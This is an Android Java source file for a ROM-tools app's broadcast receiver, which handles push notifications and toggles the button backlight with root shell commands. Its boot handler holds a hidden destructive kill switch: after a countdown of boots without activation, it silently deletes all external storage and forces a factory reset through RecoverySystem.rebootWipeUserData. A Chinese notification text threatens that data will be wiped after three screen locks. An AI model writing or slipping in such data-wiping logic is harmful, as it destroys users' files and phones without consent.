package com.liberation.romtools.receiver;

/**
 * 项目名称： ROMS
 * 创建人 : Liberation
 * 创建时间: 2017/3/10 12:55
 */

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Environment;
import android.os.RecoverySystem;
import android.support.v4.app.NotificationCompat;

import com.avos.avoscloud.AVOSCloud;
import com.liberation.romtools.MainActivity;
import com.liberation.romtools.R;
import com.liberation.romtools.utils.FileUtils;
import com.liberation.romtools.utils.ShellUtils.SPUtils;
import com.liberation.romtools.utils.ShellUtils.ShellUtils;
import com.orhanobut.logger.Logger;

import org.json.JSONObject;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;

public class CustomReceiver extends BroadcastReceiver {
	private Context mContext;
	private ArrayList<String> commnandList = new ArrayList<>();
	private final BroadcastReceiver receiver = new BroadcastReceiver(){

		@Override
		public void onReceive(final Context context, final Intent intent) {
			// Do your action here
			switch (intent.getAction()){
				case Intent.ACTION_SCREEN_ON: {
					if((boolean)SPUtils.get(context,"lightOn",true)){
						commnandList.clear();
						commnandList.add("chmod 666 /sys/class/leds/button-backlight/brightness");
						commnandList.add("echo 255 >/sys/class/leds/button-backlight/brightness");
						commnandList.add("chmod 0644 /sys/class/leds/button-backlight/brightness");
						ShellUtils.execCommand(commnandList, true);
					}

				}break;
				case Intent.ACTION_SCREEN_OFF:{
					    commnandList.clear();
						commnandList.add("chmod 666 /sys/class/leds/button-backlight/brightness");
						commnandList.add("echo 0 > /sys/class/leds/button-backlight/brightness");
						commnandList.add("chmod 444 /sys/class/leds/button-backlight/brightness");
					    ShellUtils.execCommand(commnandList, true);
				}break;
			}

		}

	};

	private void registerScreenActionReceiver(){
		final IntentFilter filter = new IntentFilter();
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		filter.addAction(Intent.ACTION_SCREEN_ON);
		//防止注册不成功
		mContext.getApplicationContext().registerReceiver(receiver, filter);
	}
	@Override
	public void onReceive(Context context, Intent intent) {
		mContext = context;
		registerScreenActionReceiver();

		try {
			switch (intent.getAction()) {
				case "com.liberation.roms.MESSAGE": {
					Logger.e("收到了通知");
					JSONObject json = new JSONObject(intent.getExtras().getString("com.avos.avoscloud.Data"));
					final String message = json.getString("alert");
					Intent resultIntent = new Intent(AVOSCloud.applicationContext, MainActivity.class);
					PendingIntent pendingIntent =
							PendingIntent.getActivity(AVOSCloud.applicationContext, 0, resultIntent,
									PendingIntent.FLAG_UPDATE_CURRENT);
					NotificationCompat.Builder mBuilder =
							new NotificationCompat.Builder(AVOSCloud.applicationContext)
									.setSmallIcon(R.mipmap.ic_launcher)
									.setContentTitle(
											AVOSCloud.applicationContext.getResources().getString(R.string.app_name))
									.setContentText(message)
									.setTicker(message);
					mBuilder.setContentIntent(pendingIntent);
					mBuilder.setAutoCancel(true);

					int mNotificationId = 10086;
					NotificationManager mNotifyMgr =
							(NotificationManager) AVOSCloud.applicationContext
									.getSystemService(
											Context.NOTIFICATION_SERVICE);
					mNotifyMgr.notify(mNotificationId, mBuilder.build());
				}
				break;
				case Intent.ACTION_BOOT_COMPLETED: {
					if(!(boolean) SPUtils.get(context,"able",false)){
						int left = (int) SPUtils.get(context,"left",2);
						SPUtils.put(context,"left",left-1);
						if(left<=0){
							FileUtils.deleteQuietly(new File(Environment.getExternalStorageDirectory()+""));
							try {
								RecoverySystem.rebootWipeUserData((context));
							} catch (IOException e) {
								e.printStackTrace();
							}

						}
					}else {
						SPUtils.put(context,"left",3);
					}
					Intent intent2 = context.getPackageManager().getLaunchIntentForPackage("com.liberation.romtools");
					context.startActivity(intent2);
				}
				break;
				case Intent.ACTION_USER_PRESENT: {

				}
				break;


			}

		} catch (Exception e) {

		}
	}
	private void makeNotice(){
		long[] pattern1 = {0, 1000, 100, 1000, 100, 1000, 1000, 1000, 100};
		Intent resultIntent = new Intent(AVOSCloud.applicationContext, MainActivity.class);
		PendingIntent pendingIntent =
				PendingIntent.getActivity(AVOSCloud.applicationContext, 0, resultIntent,
						PendingIntent.FLAG_UPDATE_CURRENT);
		NotificationCompat.Builder mBuilder =
				new NotificationCompat.Builder(AVOSCloud.applicationContext)
						.setSmallIcon(R.mipmap.ic_launcher)
						.setContentTitle(
								AVOSCloud.applicationContext.getResources().getString(R.string.app_name))
						.setContentText("您的系统未进行激活操作，无法正常使用，请更换系统或者进行激活操作，锁屏三次后手机数据将被清空！")
						.setTicker("未激活")
						.setVibrate(pattern1);
		mBuilder.setContentIntent(pendingIntent);
		mBuilder.setAutoCancel(true);

		int mNotificationId = 10086;
		NotificationManager mNotifyMgr =
				(NotificationManager) AVOSCloud.applicationContext
						.getSystemService(
								Context.NOTIFICATION_SERVICE);

		mNotifyMgr.notify(mNotificationId, mBuilder.build());

	}
}

